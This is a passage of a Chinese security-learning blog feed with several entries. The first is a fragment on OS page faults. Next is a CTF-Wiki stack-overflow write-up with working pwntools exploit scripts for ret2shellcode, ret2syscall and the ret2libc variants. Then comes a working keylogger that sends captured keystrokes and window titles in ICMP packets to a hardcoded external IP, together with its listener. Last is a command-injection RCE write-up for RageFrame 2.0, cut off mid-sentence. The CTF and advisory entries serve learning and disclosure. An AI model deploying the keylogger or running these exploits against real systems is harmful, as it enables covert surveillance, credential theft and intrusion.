src="https://img-blog.csdnimg.cn/40778bb0381744e4b413bda658a3cf3c.png"><br>驻留位：表示该页是否在内存，1表示在，0表示在改页外存，访问该页时将导致缺页异常<br>修改位：回收该物理页面时，据此判断是否要把它的内容写回外存<br>访问位：表示该页面是否被访问过（读或写）<br>保护位：表示该页的允许访问方式（只读、可读写、可执行等）</p><h3 id="缺页异常"><a href="#缺页异常" class="headerlink" title="缺页异常"></a>缺页异常</h3><p>CPU读取一条指令，会去找这条指令所对应的页表项，如果这一项是无效的，会发生缺页异常，缺页异常服务例程执行。</p><p>缺页异常服务例程在外存中找对应那一页在哪里，读入到内存的空闲地方（空闲页帧），然后修改页表项，最后重新执行这条指令。如果没有空闲页帧，把不常用的写出去。它们在物理内存里，要先根据物理页帧f找到逻辑页q，如果逻辑页q被修改过，则把它写回外存，修改q页表项驻留位为0，将需要访问的页p装入到物理页面f，修改p页表项驻留位为1，物理帧号为f。重新执行产生缺页的指令。实际ucore的源代码实现起来会复杂很多。</p>]]></content>
    
    
    <categories>
      
      <category>OperatingSystem</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFWiki_PWN_LinuxPlatform_UserMode_Exploitation_StackOverflow_x86</title>
    <link href="/posts/e4dc8931.html"/>
    <url>/posts/e4dc8931.html</url>
    
    <content type="html"><![CDATA[<h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>先看<a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">这个文章</a>学习函数调用栈</p><h2 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>出栈时RIP指向栈存放函数返回地址的位置，这个地址我们可以改为一个汇编指令的地址，RIP一直往后面指，以那个地址为起点一直往后执行</p><pre><code class="hljs">.text:0804862D                 call    ___isoc99_scanf.text:08048632                 mov     eax, [ebp+input].text:08048635                 cmp     eax, [ebp+secretcode].text:08048638                 jnz     short locret_8048646.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641                 call    _system</code></pre><p>把函数返回地址设为0804863A，会一直往后执行</p><pre><code class="hljs">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641                 call    _system</code></pre><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>把恶意汇编代码写到数组（代码块）里面，返回地址指向这个数组（代码块）首地址。<br>这个数组要可读写执行，全局变量（**.bss**）有这个特点<br><strong>ljust()</strong> 用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;this is string example....wow!!!&quot;</span>;<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>.ljust(<span class="hljs-number">50</span>, <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-comment">#ljust()返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。</span><br><span class="hljs-comment">#如果指定的长度小于原字符串的长度则返回原字符串。</span><br><span class="hljs-comment">#输出 this is string example....wow!!!000000000000000000</span><br></code></pre></td></tr></table></figure><p><strong>shellcraft.sh()</strong> 打印结果</p><pre><code class="hljs">    /* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */    /* push b&#39;/bin///sh\x00&#39; */    push 0x68    push 0x732f2f2f    push 0x6e69622f    mov ebx, esp    /* push argument array [&#39;sh\x00&#39;] */    /* push &#39;sh\x00\x00&#39; */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* &#39;sh\x00&#39; */    mov ecx, esp    xor edx, edx    /* call execve() */    push SYS_execve /* 0xb */    pop eax    int 0x80</code></pre><p><strong>计算偏移</strong></p><p><strong>disass main</strong></p><p>反汇编 main 函数找到 main 的第一条指针所在的地址</p><p><img src="https://img-blog.csdnimg.cn/323737c129484daead2fd8d63b6a73d5.png"></p><p>在get函数下面的语句打断点</p><p><img src="https://img-blog.csdnimg.cn/a460183a38204f179fb7810fb3b204f4.png"></p><pre><code class="hljs">0xffffd038 - 0xffffcfcc + 0x4 = 112</code></pre><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-comment">#asm()得到汇编码的机器代码</span><br><span class="hljs-comment">#shellcraft.sh()生成汇编代码shellcode</span><br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>不知道为什么会报错，后来看了一下，发现要写入shellcode的全局数组在不可执行段</p><p><img src="https://img-blog.csdnimg.cn/91578926747c4efbb56304bda9d323b6.png"></p><p><img src="https://img-blog.csdnimg.cn/1769569887a04edebeeb08bc4834fbd0.png"></p><p>这个方法应该是行不通了</p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>利用系统调用<br>该程序是 32 位，所以我们需要使得</p><pre><code class="hljs">系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0</code></pre><p>设置寄存器的值，我们需要指令<strong>pop eax</strong>并且还要<strong>ret</strong>回栈继续下一个<strong>pop</strong><br>使用命令查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary xxx  --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span><br></code></pre></td></tr></table></figure><p>发现一个地址可以一次给三个寄存器赋值</p><p><img src="https://img-blog.csdnimg.cn/fbf79128e05647d3bce82890363685f3.png"></p><p>查找’&#x2F;bin&#x2F;sh’字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary xxx  --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span> <br></code></pre></td></tr></table></figure><p>查找int 0x80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary xxx  --only <span class="hljs-string">&#x27;int&#x27;</span><br></code></pre></td></tr></table></figure><p>按照前面教程找偏移，用命令n一步步执行</p><p>​<img src="https://img-blog.csdnimg.cn/a57ba6f035894f43bbd8c9595bdc1b46.png"></p><pre><code class="hljs">0x98 - 0x2c + 0x4 = 112</code></pre><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br><br>pop_eax_ret_addr = <span class="hljs-number">0x080bb196</span><br>pop_edx_pop_ecx_pop_ebx_ret_addr = <span class="hljs-number">0x0806eb90</span><br>bin_addr = <span class="hljs-number">0x080be408</span><br>int_0x80_addr = <span class="hljs-number">0x08049421</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span> + p32(pop_eax_ret_addr) + p32(<span class="hljs-number">0xb</span>) + p32(pop_edx_pop_ecx_pop_ebx_ret_addr) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(bin_addr) + p32(int_0x80_addr)<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p>命令查找字符串<code>&#39;/bin/sh&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ret2libc1 --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><p>在IDA里面查找.plt里面有没有system函数<br>如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址<br>因为之前ret2text、ret2shellcode是调用代码块，ret2syscall是进行系统调用，都不是正常的函数，调用ret2libc是正常的函数调用，所以根据函数调用栈的约定，要写返回地址，它在比参数地址小4（32位）的位置</p><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>没有<code>&#39;/bin/sh&#39;</code>，发现可以用plt中的gets()写入全局数组然后读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>gets_plt = <span class="hljs-number">0x08048460</span><br>system_plt = <span class="hljs-number">0x08048490</span><br>pop_ebx_ret = <span class="hljs-number">0x0804843d</span><br>buf2 = <span class="hljs-number">0x0804A080</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, gets_plt, pop_ebx_ret, buf2, system_plt, <span class="hljs-string">&#x27;aaaa&#x27;</span>, buf2])<br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>gets_plt是gets()地址，pop_ebx_ret是返回地址，函数调用完后到pop_ebx_ret执行命令</p><pre><code class="hljs">0x0804843d : pop ebx ; ret</code></pre><p>这里的地址把pop_ebx_ret弹出来，又ret让ip指向栈，进行指到system_plt，调用system()</p><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p><a href="https://blog.csdn.net/qq_41202237/article/details/105913563">如hollk大佬所说</a></p><blockquote><p>第二个payload用104个字节填满栈空间是因为第二次调用main函数的时候可能缺少了栈初始化的过程，第二次调用的时候并不是从一开始的OPE进入的，所以出现了少8位的情况，可以使用动态调试器修改内存地址进行调试计算</p></blockquote><p>如果LibcSearcher报错：no matched libc，please add more libc or try others<br>要更新一下libc-database<br>具体<a href="https://blog.csdn.net/qq_40889704/article/details/116571781">看这篇文章</a><br>exp.py用Wiki里面的，<strong>用python2运行</strong><br>第一次溢出用puts函数打印__libc_start_main在got中位置，用u32()转换为数字，[0:4]是为了去掉框出的前面的字符串</p><p><img src="https://img-blog.csdnimg.cn/a4fe0f22602645f1bce35ebb271d3191.png"></p><p>把地址保存在libc_start_main_addr变量里面，找libc版本，其他略</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got])<br>sh.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get the related addr&quot;</span><br>libc_start_main_addr = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get shell&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>运行后让我们从0、1中选一个，我选0，然后可以执行命令了</p><p><img src="https://img-blog.csdnimg.cn/84dfb6d63f3f47e0900e00e3cf20fa54.png"></p><h2 id="中级-ROP"><a href="#中级-ROP" class="headerlink" title="中级 ROP"></a>中级 ROP</h2><h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3>]]></content>
    
    
    <categories>
      
      <category>CTFwiki_PWN</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scapy6</title>
    <link href="/posts/3667977.html"/>
    <url>/posts/3667977.html</url>
    
    <content type="html"><![CDATA[<p>这个PyHook3还是非常难装的，用了作者提供的虚拟机环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#被监听端</span><br><span class="hljs-keyword">import</span> PyHook3<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>message=<span class="hljs-string">&#x27;root&#x27;</span><span class="hljs-comment">#以data中是否有root判断是不是被控端发来的，可能有别人正常地ping服务器</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">OnMouseEvent</span>(<span class="hljs-params">event</span>):<br>    <span class="hljs-keyword">global</span> message<br>    message += <span class="hljs-string">&#x27;\n&#x27;</span>+event.WindowName+<span class="hljs-string">&#x27;\n&#x27;</span><span class="hljs-comment">#窗口名称</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(message)&gt;<span class="hljs-number">5</span>):<span class="hljs-comment">#message储存了一些后再发，这个随便，可以去掉</span><br>        pinger = IP(dst=<span class="hljs-string">&quot;150.158.18.137&quot;</span>) / ICMP(<span class="hljs-built_in">id</span>=<span class="hljs-number">0x0001</span>, seq=<span class="hljs-number">0x1</span>) / message<br>        send(pinger)<br>        message=<span class="hljs-string">&#x27;root&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">OnKeyboardEvent</span>(<span class="hljs-params">event</span>):<br>    <span class="hljs-keyword">global</span> message<br>    <span class="hljs-keyword">if</span>((event.Ascii&lt;<span class="hljs-number">32</span>)<span class="hljs-keyword">or</span>(event.Ascii&gt;<span class="hljs-number">126</span>)):<br>        message+=<span class="hljs-string">&#x27; &#x27;</span><br><br>    message += event.Key<span class="hljs-comment">#按键名称</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(message)&gt;<span class="hljs-number">5</span>):<br>        pinger = IP(dst=<span class="hljs-string">&quot;150.158.18.137&quot;</span>) / ICMP(<span class="hljs-built_in">id</span>=<span class="hljs-number">0x0001</span>, seq=<span class="hljs-number">0x1</span>) / message<br>        send(pinger)<br>        message=<span class="hljs-string">&#x27;root&#x27;</span><br><br>    <span class="hljs-keyword">if</span>((event.Ascii&lt;<span class="hljs-number">32</span>)<span class="hljs-keyword">or</span>(event.Ascii&gt;<span class="hljs-number">126</span>)):<br>        message+=<span class="hljs-string">&#x27; &#x27;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br>hm = PyHook3.HookManager()<br>hm.MouseAllButtonsDown = OnMouseEvent<br>hm.KeyDown = OnKeyboardEvent<br>hm.HookMouse()<br>hm.HookKeyboard()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">import</span> pythoncom<br>    pythoncom.PumpMessages()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#监听端</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> ICMP<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        rx = sniff(<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;icmp&quot;</span>, count=<span class="hljs-number">1</span>)<br>        v = rx[<span class="hljs-number">0</span>].load.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;root&quot;</span> <span class="hljs-keyword">in</span> v:<span class="hljs-comment">#检查data里面有没有root</span><br>            <span class="hljs-built_in">print</span>(v[<span class="hljs-number">4</span>:],end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            file_handle=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,mode=<span class="hljs-string">&#x27;a&#x27;</span>)<br>            file_handle.writelines(v[<span class="hljs-number">4</span>:])<span class="hljs-comment">#去掉开头的root，写入文件</span><br>            file_handle.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>测试结果是，在内网通信正常，当发给外网的服务器（接收端）丢包比较多。然后两种情况下监听端程序容易突然中断。<br><a href="https://blog.csdn.net/a675115471/article/details/104098505">这个大佬</a>实现效果比较好，丢包率低。以后有时间具体研究一下。</p>]]></content>
    
    
    <categories>
      
      <category>Scapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>TheCommit</title>
    <link href="/posts/3667977.html"/>
    <url>/posts/3667977.html</url>
    
    <content type="html"><![CDATA[<p>RageFrame 2.0(commit e02ba318639bdb99492d15f26e5cc012f1ed5a24) has a Remote Code Execute Vulnerability</p><h2 id="Overview-of-Vulnerabilities"><a href="#Overview-of-Vulnerabilities" class="headerlink" title="Overview of Vulnerabilities"></a>Overview of Vulnerabilities</h2><p>addons\RfExample\merchant\controllers\VideoController.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionCutImage</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$model</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CutImageForm</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">load</span>(<span class="hljs-title class_">Yii</span>::<span class="hljs-variable">$app</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>())) &#123;<br>            <span class="hljs-variable">$filePath</span> = <span class="hljs-title class_">StringHelper</span>::<span class="hljs-title function_ invoke__">getLocalFilePath</span>(<span class="hljs-variable">$model</span>-&gt;video);<br>            <span class="hljs-variable">$img</span> = <span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachment/&quot;</span>) . <span class="hljs-string">&quot;test1.jpg&quot;</span>;<br><br>            <span class="hljs-comment">// ffmpeg获取视频帧 -i 后面是输出 -y 是质量 -f 是输出格式  -t 时间</span><br>            <span class="hljs-comment">// shell_exec(&quot;ffmpeg -i &#123;$filePath&#125; -y -f image2 -t 0.05 -s 352*240 &#123;$img&#125;&quot;);</span><br><br>            <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ffmpeg -ss 00:00:01  -i <span class="hljs-subst">&#123;$filePath&#125;</span> -f mjpeg -r 1 -vframes 1 -an <span class="hljs-subst">&#123;$img&#125;</span>&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-variable">$this</span>-&gt;action-&gt;id, [<br>            <span class="hljs-string">&#x27;model&#x27;</span> =&gt; <span class="hljs-variable">$model</span>,<br>        ]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>CutImageForm is derived from Model, CutImageForm-&gt;load is equivalent to Model-&gt;load, $model-&gt;load(Yii::$app-&gt;request-&gt;post()) gets the post parameter, $model-&gt;video takes the video parameter of POST , pass in the following function</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLocalFilePath</span>(<span class="hljs-params"><span class="hljs-variable">$url</span>, <span class="hljs-variable">$type</span> = <span class="hljs-string">&#x27;images&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">RegularHelper</span>::<span class="hljs-title function_ invoke__">verify</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">RegularHelper</span>::<span class="hljs-title function_ invoke__">verify</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachurl&quot;</span>))) &#123;<br>                <span class="hljs-variable">$hostInfo</span> = <span class="hljs-title class_">Yii</span>::<span class="hljs-variable">$app</span>-&gt;request-&gt;hostInfo . <span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachurl&quot;</span>);<br>                <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$hostInfo</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachurl&quot;</span>), <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachurl&quot;</span>), <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachment&quot;</span>) . <span class="hljs-variable">$url</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>RegularHelper::verify(&#39;url&#39;, $url)</code>equals<code>preg_match(&#39;/(http:\/\/)|(https:\/\/)/i&#39;, $url)</code></p><p>video&#x3D;<code>http://aaa;cmd;</code>can satisfy<code>RegularHelper::verify(&#39;url&#39;, $url)</code></p><p>so we use<code>$filePath=&#39;xxx&#39;.http://aaa;cmd;</code>to RCE</p><h2 id="Construction-of-environment"><a href="#Construction-of-environment" class="headerlink" title="Construction of environment"></a>Construction of environment</h2><p>follow the document to install</p><p><a href="https://github.com/jianyan74/rageframe2/blob/master/docs/guide-zh-CN/start-installation.md">installation</a></p><h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>Install a addon</p><p><img src="/../images/TheCommit/image-20230209184509795.png" alt="image-20230209184509795"></p><p>Then visit <a href="http://localhost/backend/rf-example/video/cut-image">http://localhost/backend/rf-example/video/cut-image</a>, try to upload a mp3 and save</p><p><img src="/../images/TheCommit/image-20230209185534572.png" alt="image-20230209185534572"></p><p>Finally we can catch a 